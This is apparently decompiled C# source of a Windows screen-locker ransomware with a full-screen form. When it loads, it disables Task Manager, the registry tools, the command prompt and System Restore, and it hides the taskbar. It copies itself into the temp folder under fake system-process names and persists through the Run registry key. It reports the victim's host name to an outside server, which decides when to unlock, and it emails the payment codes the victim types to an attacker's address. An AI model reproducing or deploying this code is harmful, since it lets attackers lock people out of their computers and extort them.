		((Control)this).get_Controls().Add((Control)(object)vmethod_44());
		((Control)this).get_Controls().Add((Control)(object)vmethod_42());
		((Control)this).get_Controls().Add((Control)(object)vmethod_40());
		((Control)this).get_Controls().Add((Control)(object)vmethod_38());
		((Control)this).get_Controls().Add((Control)(object)vmethod_36());
		((Control)this).get_Controls().Add((Control)(object)vmethod_34());
		((Control)this).get_Controls().Add((Control)(object)vmethod_32());
		((Control)this).get_Controls().Add((Control)(object)vmethod_30());
		((Control)this).get_Controls().Add((Control)(object)vmethod_28());
		((Control)this).get_Controls().Add((Control)(object)vmethod_26());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_12());
		((Control)this).get_Controls().Add((Control)(object)vmethod_10());
		((Control)this).get_Controls().Add((Control)(object)vmethod_8());
		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_18());
		((Control)this).set_Font(new Font("Courier New", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(SystemColors.ActiveCaptionText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(4);
		((Form)this).set_Margin(margin);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)vmethod_20()).EndInit();
		((ISupportInitialize)vmethod_18()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_3)
	{
		EventHandler eventHandler = method_2;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_3;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_2()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(TextBox textBox_6)
	{
		textBox_0 = textBox_6;
	}

	[SpecialName]
	internal virtual Label vmethod_4()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(Label label_1)
	{
		label_0 = label_1;
	}

	[SpecialName]
	internal virtual WebBrowser vmethod_6()
	{
		return webBrowser_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(WebBrowser webBrowser_2)
	{
		webBrowser_0 = webBrowser_2;
	}

	[SpecialName]
	internal virtual TextBox vmethod_8()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(TextBox textBox_6)
	{
		textBox_1 = textBox_6;
	}

	[SpecialName]
	internal virtual TextBox vmethod_10()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(TextBox textBox_6)
	{
		textBox_2 = textBox_6;
	}

	[SpecialName]
	internal virtual TextBox vmethod_12()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(TextBox textBox_6)
	{
		textBox_3 = textBox_6;
	}

	[SpecialName]
	internal virtual TextBox vmethod_14()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(TextBox textBox_6)
	{
		textBox_4 = textBox_6;
	}

	[SpecialName]
	internal virtual Timer vmethod_16()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(Timer timer_3)
	{
		EventHandler eventHandler = method_3;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_3;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox vmethod_18()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(PictureBox pictureBox_2)
	{
		pictureBox_0 = pictureBox_2;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_20()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(PictureBox pictureBox_2)
	{
		pictureBox_1 = pictureBox_2;
	}

	[SpecialName]
	internal virtual Timer vmethod_22()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(Timer timer_3)
	{
		EventHandler eventHandler = method_4;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = timer_3;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_24()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(Button button_27)
	{
		button_0 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_26()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_27(Button button_27)
	{
		button_1 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_28()
	{
		return button_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_29(Button button_27)
	{
		button_2 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_30()
	{
		return button_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_31(Button button_27)
	{
		button_3 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_32()
	{
		return button_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_33(Button button_27)
	{
		button_4 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_34()
	{
		return button_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_35(Button button_27)
	{
		button_5 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_36()
	{
		return button_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_37(Button button_27)
	{
		button_6 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_38()
	{
		return button_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_39(Button button_27)
	{
		button_7 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_40()
	{
		return button_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_41(Button button_27)
	{
		button_8 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_42()
	{
		return button_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_43(Button button_27)
	{
		button_9 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_44()
	{
		return button_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_45(Button button_27)
	{
		button_10 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_46()
	{
		return button_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_47(Button button_27)
	{
		button_11 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_48()
	{
		return button_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_49(Button button_27)
	{
		button_12 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_50()
	{
		return button_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_51(Button button_27)
	{
		button_13 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_52()
	{
		return button_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_53(Button button_27)
	{
		button_14 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_54()
	{
		return button_15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_55(Button button_27)
	{
		button_15 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_56()
	{
		return button_16;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_57(Button button_27)
	{
		button_16 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_58()
	{
		return button_17;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_59(Button button_27)
	{
		button_17 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_60()
	{
		return button_18;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_61(Button button_27)
	{
		button_18 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_62()
	{
		return button_19;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_63(Button button_27)
	{
		button_19 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_64()
	{
		return button_20;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_65(Button button_27)
	{
		button_20 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_66()
	{
		return button_21;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_67(Button button_27)
	{
		button_21 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_68()
	{
		return button_22;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_69(Button button_27)
	{
		button_22 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_70()
	{
		return button_23;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_71(Button button_27)
	{
		button_23 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_72()
	{
		return button_24;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_73(Button button_27)
	{
		EventHandler eventHandler = method_5;
		if (button_24 != null)
		{
			((Control)button_24).remove_Click(eventHandler);
		}
		button_24 = button_27;
		if (button_24 != null)
		{
			((Control)button_24).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_74()
	{
		return button_25;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_75(Button button_27)
	{
		button_25 = button_27;
	}

	[SpecialName]
	internal virtual Button vmethod_76()
	{
		return button_26;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_77(Button button_27)
	{
		button_26 = button_27;
	}

	[SpecialName]
	internal virtual WebBrowser vmethod_78()
	{
		return webBrowser_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_79(WebBrowser webBrowser_2)
	{
		webBrowser_1 = webBrowser_2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int int_3, int int_4, int int_5, int int_6, int int_7, int int_8, int int_9);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	private void Form1_Load(object sender, EventArgs e)
	{
		vmethod_6().Navigate("http://mangakacorp.altervista.org/lecture.php?nompc=" + Dns.GetHostByName(Environment.MachineName).HostName);
		vmethod_78().Navigate("http://mangakacorp.altervista.org/LoisInformatique.txt");
		method_0();
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System\\ /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		string string_ = "Shell_traywnd";
		string string_2 = "";
		int_2 = FindWindowA(ref string_, ref string_2);
		SetWindowPos(int_2, 0, 0, 0, 0, 0, 128);
		vmethod_0().Start();
		vmethod_16().Start();
	}

	public void method_0()
	{
		try
		{
			if (!File.Exists(Path.GetTempPath() + "winlogon32.exe"))
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + "winlogon32.exe");
			}
			if (!File.Exists(Path.GetTempPath() + "csrss32.exe"))
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + "csrss32.exe");
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Winlogon (32 Bits)", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\winlogon32.exe");
			registryKey.SetValue("Csrss (32 Bits)", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\csrss32.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		textBox_5 = (TextBox)((sender is TextBox) ? sender : null);
	}

	private void method_2(object sender, EventArgs e)
	{
		WebClient webClient = new WebClient();
		string text = webClient.DownloadString("http://mangakacorp.altervista.org/victimes/" + Dns.GetHostByName(Environment.MachineName).HostName);
		if (Operators.CompareString(text, "1", false) == 0)
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System\\ /v DisableCMD /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 0 /f", (AppWinStyle)1, false, -1);
			if (File.Exists(Path.GetTempPath() + "winlogon32.exe"))
			{
				File.Delete(Path.GetTempPath() + "winlogon32.exe");
			}
			if (File.Exists(Path.GetTempPath() + "csrss32.exe"))
			{
				File.Delete(Path.GetTempPath() + "csrss32.exe");
			}
			string string_ = "Shell_traywnd";
			string string_2 = "";
			int_2 = FindWindowA(ref string_, ref string_2);
			SetWindowPos(int_2, 0, 0, 0, 0, 0, 64);
			((Form)this).Close();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("winlogon32");
		if (processesByName == null)
		{
			Interaction.Shell(Path.GetTempPath() + "winlogon32.exe", (AppWinStyle)2, false, -1);
		}
		Process[] processesByName2 = Process.GetProcessesByName("csrss32");
		if (processesByName2 == null)
		{
			Interaction.Shell(Path.GetTempPath() + "csrss32.exe", (AppWinStyle)2, false, -1);
		}
	}

	private void method_4(object sender, EventArgs e)
	{
	}

	private void method_5(object sender, EventArgs e)
	{
		vmethod_6().Navigate("http://mangakacorp.altervista.org/mail.php?to=elodmpazerty@gmail.com&subject={" + Dns.GetHostByName(Environment.MachineName).HostName + "} Nouveaux codes audiotels&message=" + vmethod_2().get_Text() + "<br />" + vmethod_8().get_Text() + "<br />" + vmethod_10().get_Text() + "<br />" + vmethod_12().get_Text() + "<br />" + vmethod_14().get_Text());
	}
}
